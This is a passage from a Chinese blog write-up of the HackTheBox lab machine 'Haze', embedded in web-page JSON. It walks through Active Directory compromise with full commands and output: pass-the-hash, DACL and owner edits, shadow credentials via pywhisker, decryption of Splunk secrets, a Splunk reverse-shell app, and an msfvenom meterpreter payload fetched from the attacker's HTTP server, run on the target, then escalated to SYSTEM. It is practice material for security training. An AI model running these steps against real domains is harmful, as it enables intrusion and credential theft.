alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e跟着\u003ccode\u003eBloodHound\u003c/code\u003e提示走，修改\u003ccode\u003eSUPPORT_SERVICES\u003c/code\u003e 的所有者从\u003ccode\u003eDomain admins\u003c/code\u003e修改为\u003ccode\u003eHaze-IT-Backup$\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  owneredit.py -action write -target \u003cspan class=\"hljs-string\"\u003e'SUPPORT_SERVICES'\u003c/span\u003e -new-owner \u003cspan class=\"hljs-string\"\u003e'Haze-IT-Backup$'\u003c/span\u003e haze.htb/\u003cspan class=\"hljs-string\"\u003e'Haze-IT-Backup$'\u003c/span\u003e -hashes \u003cspan class=\"hljs-string\"\u003e':735c02c6b2dc54c3c8c6891f55279ebc'\u003c/span\u003e -dc-ip 10.10.11.61\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Current owner information below\n[*] - SID: S-1-5-21-323145914-28650650-2368316563-512\n[*] - sAMAccountName: Domain Admins\n[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=haze,DC=htb\n[*] OwnerSid modified successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e赋予自己\u003ccode\u003eSUPPORT_SERVICES\u003c/code\u003e 完全权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/gMSADumper  dacledit.py -action write -target \u003cspan class=\"hljs-string\"\u003e'SUPPORT_SERVICES'\u003c/span\u003e -rights FullControl -principal \u003cspan class=\"hljs-string\"\u003e'Haze-IT-Backup$'\u003c/span\u003e haze.htb/\u003cspan class=\"hljs-string\"\u003e'Haze-IT-Backup$'\u003c/span\u003e -hashes \u003cspan class=\"hljs-string\"\u003e':735c02c6b2dc54c3c8c6891f55279ebc'\u003c/span\u003e -dc-ip 10.10.11.61\n\n[*] DACL backed up to dacledit-20250331-080046.bak\n[*] DACL modified successfully\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e修改密码….失败\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  pth-net rpc password \u003cspan class=\"hljs-string\"\u003e\"edward.martin\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'Aa118811'\u003c/span\u003e -U \u003cspan class=\"hljs-string\"\u003e\"haze.htb\"\u003c/span\u003e/\u003cspan class=\"hljs-string\"\u003e\"Haze-IT-Backup$\"\u003c/span\u003e%\u003cspan class=\"hljs-string\"\u003e\"0926f5e64d85018a506ecadff3df4f95\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"735c02c6b2dc54c3c8c6891f55279ebc\"\u003c/span\u003e -S \u003cspan class=\"hljs-string\"\u003e\"dc01.haze.htb\"\u003c/span\u003e\nE_md4hash wrapper called.\nHASH PASS: Substituting user supplied NTLM HASH...\nFailed to \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'edward.martin'\u003c/span\u003e with error: Access is denied..\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再寻找别的路子，发现\u003ccode\u003eSUPPORT_SERVICES\u003c/code\u003e还对matin拥有\u003ccode\u003eAddKeyCredentialLink\u003c/code\u003e属性\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image70.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以使用\u003ccode\u003epywhisker\u003c/code\u003e给目标账户添加**\u003ccode\u003emsDS-KeyCredentialLink\u003c/code\u003e** 属性然后进行密钥登陆，而无需密码\u003c/p\u003e\n\u003cp\u003e要先将\u003ccode\u003eHaze-IT-Backup$\u003c/code\u003e添加到组，先获取其\u003ccode\u003eTGT\u003c/code\u003e票据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  ntpdate -s 10.10.11.61  \n⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  getTGT.py haze.htb/\u003cspan class=\"hljs-string\"\u003e'Haze-IT-Backup$'\u003c/span\u003e -hashes \u003cspan class=\"hljs-string\"\u003e'0926f5e64d85018a506ecadff3df4f95'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'735c02c6b2dc54c3c8c6891f55279ebc'\u003c/span\u003e -dc-ip 10.10.11.61\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e Haze-IT-Backup$.ccache\n⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=Haze-IT-Backup.ccache         \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再通过\u003ccode\u003ebloodyAD\u003c/code\u003e将自己添加\u003ccode\u003eSUPPORT_SERVICES\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools/Domain/bloodyAD  python3 bloodyAD.py --host dc01.haze.htb -d haze.htb -u \u003cspan class=\"hljs-string\"\u003e\"Haze-IT-Backup$\"\u003c/span\u003e -k add groupMember \u003cspan class=\"hljs-string\"\u003e\"SUPPORT_SERVICES\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Haze-IT-Backup$\"\u003c/span\u003e                                                              \n[+] Haze-IT-Backup$ added to SUPPORT_SERVICES\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过\u003ccode\u003epywhisker\u003c/code\u003e给目标账户添加**\u003ccode\u003emsDS-KeyCredentialLink\u003c/code\u003e** 属性，运行成功后生成了 PFX 证书（\u003ccode\u003emdpJu0Mx.pfx\u003c/code\u003e）用于 \u003cstrong\u003ePKINIT\u003c/strong\u003e 认证，提示我们可以使用\u003ccode\u003ePKINITtools\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools/Domain/pywhisker/pywhisker  python3 pywhisker.py -d haze.htb -u \u003cspan class=\"hljs-string\"\u003e\"Haze-IT-Backup$\"\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e\"0926f5e64d85018a506ecadff3df4f95\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"735c02c6b2dc54c3c8c6891f55279ebc\"\u003c/span\u003e --target \u003cspan class=\"hljs-string\"\u003e\"edward.martin\"\u003c/span\u003e --action \u003cspan class=\"hljs-string\"\u003e\"add\"\u003c/span\u003e\n[*] Searching \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the target account\n[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating KeyCredential\n[*] KeyCredential generated with DeviceID: f529684c-94a0-f254-102e-022b29257375\n[*] Updating the msDS-KeyCredentialLink attribute of edward.martin\n[+] Updated the msDS-KeyCredentialLink attribute of the target object\n[*] Converting PEM -\u003e PFX with cryptography: mdpJu0Mx.pfx\n[+] PFX exportiert nach: mdpJu0Mx.pfx\n[i] Passwort für PFX: 9A16naTa46UFxd15fGWs\n[+] Saved PFX (#PKCS12) certificate \u0026#x26; key at path: mdpJu0Mx.pfx\n[*] Must be used with password: 9A16naTa46UFxd15fGWs\n[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003ePKINITtools\u003c/code\u003e通过\u003ccode\u003epfx\u003c/code\u003e证书生成\u003ccode\u003eTGT\u003c/code\u003e ，并将其导入到环境变量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools/Domain/PKINITtools  python3 gettgtpkinit.py haze.htb/edward.martin -cert-pfx ../pywhisker/pywhisker/mdpJu0Mx.pfx -pfx-pass 9A16naTa46UFxd15fGWs martin.ccache\n2025-04-01 05:36:57,751 minikerberos INFO     Loading certificate and key from file\nINFO:minikerberos:Loading certificate and key from file\n2025-04-01 05:36:57,857 minikerberos INFO     Requesting TGT\nINFO:minikerberos:Requesting TGT\n2025-04-01 05:37:06,040 minikerberos INFO     AS-REP encryption key (you might need this later):\nINFO:minikerberos:AS-REP encryption key (you might need this later):\n2025-04-01 05:37:06,040 minikerberos INFO     c0ca345d16085d5058f66534cef843377b461bda39976dced6b9b2ab332b3aaf\nINFO:minikerberos:c0ca345d16085d5058f66534cef843377b461bda39976dced6b9b2ab332b3aaf\n2025-04-01 05:37:06,049 minikerberos INFO     Saved TGT to file\nINFO:minikerberos:Saved TGT to file\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e因为\u003ccode\u003emartin\u003c/code\u003e在远程组里面，可以通过\u003ccode\u003ewinrm\u003c/code\u003e进行连接\u003c/p\u003e\n\u003cp\u003e首先创建\u003ccode\u003erealm\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[libdefaults]\n    default_realm = HAZE.HTB\n    dns_lookup_realm = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    dns_lookup_kdc = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\n[realms]\n    HAZE.HTB = {\n        kdc = dc01.haze.htb\n        admin_server = dc01.haze.htb\n        default_domain = dc01.haze.htb\n    }\n\n[domain_realm]\n    haze.htb = HAZE.HTB\n    .haze.htb = HAZE.HTB\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eevil-winrm\u003c/code\u003e进行登录，登录成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools/Domain/PKINITtools  evil-winrm -i dc01.haze.htb -r haze.htb   \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\edward.martin\\Documents\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得user.txt\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\edward.martin\\desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\nf907cd5fe75b817de491a3d82b730c63\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eBloodHound\u003c/code\u003e分析\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image71.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e没找到可以利用的的方法，翻找一下文件，因为是\u003ccode\u003ebackup_reviewers\u003c/code\u003e组的成员\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\edward.martin\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e ../../../backups\n*Evil-WinRM* PS C:\\backups\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n\n    Directory: C:\\backups\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          3/5/2025  12:33 AM                Splunk\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSplunk\u003c/code\u003e的备份，Dump出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  evil-winrm -i dc01.haze.htb -r haze.htb\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\edward.martin\\Documents\u003e download ../../../backups/splunk\n                                        \nInfo: Downloading C:\\Users\\edward.martin\\Documents\\../../../backups/splunk to splunk\n                                        \nInfo: Download successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e解压后检索敏感信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/Haze/splunk/Splunk  grep -m1 -rE \u003cspan class=\"hljs-string\"\u003e'pass'\u003c/span\u003e ./\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现\u003ccode\u003ebindDNpassword\u003c/code\u003e和之前获得不一样了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image72.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e像是 \u003ccode\u003ealexander.green\u003c/code\u003e 的凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/splunk/Splunk  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf \n[default]\n\nminPasswordLength = 8\nminPasswordUppercase = 0\nminPasswordLowercase = 0\nminPasswordSpecial = 0\nminPasswordDigit = 0\n\n[Haze LDAP Auth]\n\nSSLEnabled = 0\nanonymous_referrals = 1\nbindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb\nbindDNpassword = $1\u003cspan class=\"hljs-variable\"\u003e$YDz8WfhoCWmf6aTRkA\u003c/span\u003e+QqUI=\ncharset = utf8\nemailAttribute = mail\nenableRangeRetrieval = 0\ngroupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb\ngroupMappingAttribute = dn\ngroupMemberAttribute = member\ngroupNameAttribute = cn\nhost = dc01.haze.htb\nnestedGroups = 0\nnetwork_timeout = 20\npagelimit = -1\nport = 389\nrealNameAttribute = cn\nsizelimit = 1000\ntimelimit = 15\nuserBaseDN = CN=Users,DC=haze,DC=htb\nuserNameAttribute = samaccountname\n\n[authentication]\nauthSettings = Haze LDAP Auth\nauthType = LDAP#                               \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再使用\u003ccode\u003eSplunk.Secret\u003c/code\u003e来解密，这里使用的\u003ccode\u003eSplunk.Secret\u003c/code\u003e 是备份文件夹下面的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/splunk/Splunk/etc/auth  splunksecrets splunk-decrypt -S splunk.secret --ciphertext \u003cspan class=\"hljs-string\"\u003e'$1$YDz8WfhoCWmf6aTRkA+QqUI='\u003c/span\u003e\n/root/.local/share/pipx/venvs/splunksecrets/lib/python3.12/site-packages/splunksecrets.py:48: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 48.0.0.\n  algorithm = algorithms.ARC4(key)\nSp1unkadmin@2k24\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得密码\u003ccode\u003eSp1unkadmin@2k24\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003eBloodHound\u003c/code\u003e中查看Alexander的信息，Alexander是\u003ccode\u003eSPLUNK_ADMINS\u003c/code\u003e的成员，应该可以登录\u003ccode\u003eWEB\u003c/code\u003e端\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image73.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试\u003ccode\u003eadmin:Sp1unkadmin@2k24\u003c/code\u003e 成功进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image74.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过搜索引擎检索，Splunk 后台貌似拥有安装自定义应用反弹\u003ccode\u003eShell\u003c/code\u003e的方法，这里也存在上传页面，可以进行尝试\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image75.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e(PS:一开始尝试了\u003ca href=\"https://github.com/TBGSecurity/splunk_shells%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E6%90%9C%E7%B4%A2\"\u003ehttps://github.com/TBGSecurity/splunk_shells，然后发现无法执行搜索\u003c/a\u003e..)\u003c/p\u003e\n\u003cp\u003e通过工具来获得\u003ccode\u003eshell\u003c/code\u003e：\u003ca href=\"https://github.com/0xjpuff/reverse_shell_splunk\"\u003ehttps://github.com/0xjpuff/reverse_shell_splunk\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e照着流程走即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  /usr/share/windows-resources/powersploit/Recon  nc -lvp 4444\nlistening on [any] 4444 ...\nconnect to [xxxxxxx] from haze.htb [10.10.11.61] 64713\n\u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\nhaze\\alexander.green\nPS C:\\Windows\\system32\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们将他传到MSF，先创建 payload\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  msfvenom -p windows/meterpreter/reverse_tcp lhost=xxxxxxx lport=4443 -f exe -o shell.exe\nWarning: KRB5CCNAME environment variable not supported - unsetting\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e selected, selecting \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: shell.exe\n ⚡ root@kali  ~/Desktop/test/Haze  python -m http.server 8081\nServing HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eMSF 监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 \u003e use exploit/multi/handler \n[*] Using configured payload windows/meterpreter/reverse_tcp                  \nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport 4443                                                                                                                 \nlport =\u003e 4443                                                                                                                                                \nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost xxxxx\nmsf6 exploit(multi/handler) \u003e run\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e靶机拉取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\alexander.green\\desktop\u003e wget xxxxxxx:8081/shell.exe -o shell.exe\nPS C:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\alexander.green\\desktop\u003e \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e\n\n    Directory: C:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\alexander.green\\desktop\n\nMode                 LastWriteTime         Length Name                                                                 \n----                 -------------         ------ ----                                                                 \n-a----          4/1/2025   7:35 AM          73802 shell.exe                                                            \n\nPS C:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\alexander.green\\desktop\u003e ./shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eMSF 就能接收到 \u003ccode\u003eshell\u003c/code\u003e 了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 exploit(multi/handler) \u003e run\n\n[*] Started reverse TCP handler on xxxxxxx:4443 \n[*] Sending stage (177734 bytes) to 10.10.11.61\n[*] Meterpreter session 1 opened (xxxxxxx:4443 -\u003e 10.10.11.61:64026) at 2025-04-01 10:35:34 -0400\n\nmeterpreter \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试提权，直接成了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emeterpreter \u003e getsystem\n...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).\nmeterpreter \u003e getuid\nServer username: NT AUTHORITY\\SYSTEM\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\Users\\Administrator\\Desktop\u003e\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n72c2d39ecedd0b40f3d8be2721d52748\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e好玩，涉及的域渗透知识很多，不懂的也很多，学习到了gMSA组的利用，以及**\u003ccode\u003eKeyCredentialLink\u003c/code\u003e** 获得用户TGT，还有很多的思路。没提示的话感觉会倒在枚举用户名的那块。比前几期的域机器体验好多了;D\u003c/p\u003e","title":"HackTheBox - Season7-Haze","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","域渗透","Windows靶机","encrypt"],"categories":"靶机","isEncrypted":true}},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"04","id":"HackTheBoxSeason7-Haze"},"buildId":"TQkCFKbomQ5ZAXR97drm1","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>